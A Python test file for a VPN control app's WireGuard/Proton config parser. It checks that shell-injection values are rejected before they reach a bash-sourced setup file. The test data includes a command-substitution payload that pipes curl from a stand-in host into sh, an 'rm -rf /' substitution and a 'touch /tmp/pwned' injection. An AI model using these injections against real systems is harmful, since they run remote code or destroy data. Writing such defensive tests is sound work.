"""Warp Geo: сохранение Proton-конфига и смена провайдера.

Covers parse_proton_wg_conf/save_proton_config/set_warp_provider/apply_warp_changes
in app/services/warp_geo.py - особое внимание валидации ввода, так как результат
потом попадает в файл, который bash делает `source` (up.sh).
"""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from app.services.warp_geo import (
    ProtonConfigError,
    apply_warp_changes,
    parse_proton_wg_conf,
    save_proton_config,
    set_warp_provider,
)

VALID_KEY_A = "uEPQs+EiRfLL4ok3NuNxSklLyR2YboTUNWDmRIla32o="
VALID_KEY_B = "j9ruoeI+is+DlEAawMpP+07mW20LO2PSytInBbCfASw="
VALID_KEY_C = "YKf6bIg+NG46zZhqJZKEIa7L0NUBehEtrBE+1WHptHc="
VALID_KEY_D = "SfUu22F4oN8aDNaZ/O7pNvAorDTREV2Xrx8vT1engn4="

VALID_CONF = f"""[Interface]
PrivateKey = {VALID_KEY_A}
Address = 10.2.0.2/32

[Peer]
PublicKey = {VALID_KEY_B}
Endpoint = 79.127.186.163:51820
"""


def test_parse_valid_config():
    parsed = parse_proton_wg_conf(VALID_CONF)
    assert parsed == {
        "private_key": VALID_KEY_A,
        "public_key": VALID_KEY_B,
        "address": "10.2.0.2",
        "endpoint_host": "79.127.186.163",
        "endpoint_port": "51820",
    }


def test_parse_rejects_missing_fields():
    with pytest.raises(ProtonConfigError, match="PrivateKey, PublicKey, Address и Endpoint"):
        parse_proton_wg_conf(f"PrivateKey = {VALID_KEY_A}\n")


def test_parse_rejects_command_injection_in_private_key():
    # Regression: setup файл читается через `source setup` в bash - невалидированное
    # значение вроде $(curl evil|sh) стало бы исполняемой командой при следующем up.sh.
    malicious = VALID_CONF.replace(VALID_KEY_A, "$(curl -sSL evil.sh | sh)")
    with pytest.raises(ProtonConfigError, match="PrivateKey не похож"):
        parse_proton_wg_conf(malicious)


def test_parse_rejects_command_injection_in_endpoint_host():
    malicious = VALID_CONF.replace("79.127.186.163", "$(rm -rf /)")
    with pytest.raises(ProtonConfigError, match="Endpoint host"):
        parse_proton_wg_conf(malicious)


def test_parse_rejects_bad_port():
    malicious = VALID_CONF.replace("51820", "99999")
    with pytest.raises(ProtonConfigError, match="Endpoint port"):
        parse_proton_wg_conf(malicious)


def test_parse_rejects_non_ipv4_address():
    malicious = VALID_CONF.replace("10.2.0.2/32", "; touch /tmp/pwned #/32")
    with pytest.raises(ProtonConfigError, match="Address"):
        parse_proton_wg_conf(malicious)


def test_parse_accepts_hostname_endpoint():
    conf = VALID_CONF.replace("79.127.186.163", "proton-relay.example.com")
    parsed = parse_proton_wg_conf(conf)
    assert parsed["endpoint_host"] == "proton-relay.example.com"


def _write_setup(tmp_path: Path, extra: str = "") -> Path:
    (tmp_path / "setup").write_text(
        "SETUP_DATE=2026-09-15T00:00:00+00:00\nWARP_PROVIDER=proton\n" + extra,
        encoding="utf-8",
    )
    return tmp_path


def test_save_proton_config_writes_fields(tmp_path):
    _write_setup(tmp_path)

    result = save_proton_config("antizapret", VALID_CONF, tmp_path)

    assert result == {"success": True, "scope": "antizapret"}
    content = (tmp_path / "setup").read_text(encoding="utf-8")
    assert f"PROTON_ANTIZAPRET_PRIVATE_KEY={VALID_KEY_A}" in content
    assert f"PROTON_ANTIZAPRET_PUBLIC_KEY={VALID_KEY_B}" in content
    assert "PROTON_ANTIZAPRET_ADDRESS=10.2.0.2" in content
    assert "PROTON_ANTIZAPRET_ENDPOINT_HOST=79.127.186.163" in content
    assert "PROTON_ANTIZAPRET_ENDPOINT_PORT=51820" in content


def test_save_proton_config_preserves_other_lines(tmp_path):
    _write_setup(tmp_path, "ANTIZAPRET_DNS=1\nVPN_DNS=1\n")

    save_proton_config("antizapret", VALID_CONF, tmp_path)

    content = (tmp_path / "setup").read_text(encoding="utf-8")
    assert "ANTIZAPRET_DNS=1" in content
    assert "VPN_DNS=1" in content
    assert "WARP_PROVIDER=proton" in content


def test_save_proton_config_rejects_reused_key_across_scopes(tmp_path):
    other_conf = VALID_CONF.replace("79.127.186.163", "79.127.186.164")
    _write_setup(tmp_path, f"PROTON_ANTIZAPRET_PRIVATE_KEY={VALID_KEY_A}\n")

    with pytest.raises(ProtonConfigError, match="уже используется для другого scope"):
        save_proton_config("vpn", other_conf, tmp_path)


def test_save_proton_config_allows_different_keys_across_scopes(tmp_path):
    antizapret_conf = VALID_CONF
    vpn_conf = f"""[Interface]
PrivateKey = {VALID_KEY_C}
Address = 10.2.0.2/32

[Peer]
PublicKey = {VALID_KEY_D}
Endpoint = 79.127.186.164:51820
"""
    _write_setup(tmp_path)
    save_proton_config("antizapret", antizapret_conf, tmp_path)

    result = save_proton_config("vpn", vpn_conf, tmp_path)

    assert result["success"] is True
    content = (tmp_path / "setup").read_text(encoding="utf-8")
    assert f"PROTON_VPN_PRIVATE_KEY={VALID_KEY_C}" in content
    assert f"PROTON_ANTIZAPRET_PRIVATE_KEY={VALID_KEY_A}" in content


def test_set_warp_provider_writes_field(tmp_path):
    _write_setup(tmp_path)

    result = set_warp_provider("cloudflare", tmp_path)

    assert result == {"success": True, "warp_provider": "cloudflare"}
    content = (tmp_path / "setup").read_text(encoding="utf-8")
    assert "WARP_PROVIDER=cloudflare" in content


def test_apply_warp_changes_runs_up_sh(tmp_path, monkeypatch):
    up_sh = tmp_path / "up.sh"
    up_sh.write_text("#!/bin/bash\necho ok\n", encoding="utf-8")

    fake_result = SimpleNamespace(returncode=0, stdout="Started warp-antizapret: connected\n", stderr="")
    with patch("app.services.warp_geo.subprocess.run", return_value=fake_result) as run:
        result = apply_warp_changes(tmp_path)

    assert result["success"] is True
    assert "Started warp-antizapret" in result["output"]
    run.assert_called_once()
    assert run.call_args.args[0] == [str(up_sh)]


def test_apply_warp_changes_missing_up_sh(tmp_path):
    result = apply_warp_changes(tmp_path)
    assert result["success"] is False
    assert "не найден" in result["output"]


def test_local_node_adapter_warp_write_methods_delegate(tmp_path):
    from app.services.node_adapter import LocalNodeAdapter

    adapter = LocalNodeAdapter(service=MagicMock(base_path=tmp_path))

    with patch("app.services.warp_geo.save_proton_config", return_value={"success": True}) as fn:
        adapter.save_warp_proton_config("antizapret", VALID_CONF)
    fn.assert_called_once_with("antizapret", VALID_CONF, tmp_path)

    with patch("app.services.warp_geo.set_warp_provider", return_value={"success": True}) as fn:
        adapter.set_warp_provider("proton")
    fn.assert_called_once_with("proton", tmp_path)

    with patch("app.services.warp_geo.apply_warp_changes", return_value={"success": True}) as fn:
        adapter.apply_warp_changes()
    fn.assert_called_once_with(tmp_path)


def test_remote_node_adapter_warp_write_methods_hit_expected_routes():
    from app.services.node_adapter import RemoteNodeAdapter

    adapter = RemoteNodeAdapter("127.0.0.1", 9100, "secret")

    with patch.object(adapter, "_request", return_value={"success": True}) as request:
        adapter.save_warp_proton_config("vpn", VALID_CONF)
    request.assert_called_once_with(
        "POST", "/warp-geo/proton-config", json={"scope": "vpn", "raw_config": VALID_CONF}, timeout=30.0,
    )

    with patch.object(adapter, "_request", return_value={"success": True}) as request:
        adapter.set_warp_provider("cloudflare")
    request.assert_called_once_with("POST", "/warp-geo/provider", json={"provider": "cloudflare"}, timeout=30.0)

    with patch.object(adapter, "_request", return_value={"success": True}) as request:
        adapter.apply_warp_changes()
    request.assert_called_once_with("POST", "/warp-geo/apply", timeout=70.0)
